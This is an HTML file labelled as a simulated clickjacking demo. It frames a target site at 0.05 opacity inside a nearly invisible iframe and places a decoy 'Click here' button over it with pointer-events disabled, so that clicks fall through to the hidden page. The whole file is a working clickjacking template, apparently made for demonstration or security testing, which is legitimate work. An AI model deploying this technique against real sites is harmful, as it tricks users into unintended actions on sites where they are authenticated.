<!DOCTYPE html>
<html>
<head>
    <style>
        .iframe-container {
            position: relative;
            width: 600px;
            height: 400px;
        }

        iframe {
            position: absolute;
            top: 0;
            left: 0;
            opacity: 0.05; /* almost invisible */
            width: 100%;
            height: 100%;
            border: 2px solid red;
            z-index: 1;
        }

        .decoy-overlay {
            position: absolute;
            top: 250px;
            left: 250px;
            width: 100px;
            height: 40px;
            z-index: 2;
            background-color: rgba(0, 255, 0, 0.3);
            border: 2px solid black;
            text-align: center;
            line-height: 40px;
            font-weight: bold;
            pointer-events: none; /* THIS lets click pass through to iframe */
        }
    </style>
    
</head>
<body>

<h3>Demo: Simulated Clickjacking Page</h3>
<p>If you click the green box, the click will go through to the iframe underneath.</p>

<div class="iframe-container">
    <iframe src="https://vuln.clickjacker.io" title="Victim Site"></iframe>
    <button class="decoy-overlay">Click here</button>
</div>

</body>
</html>
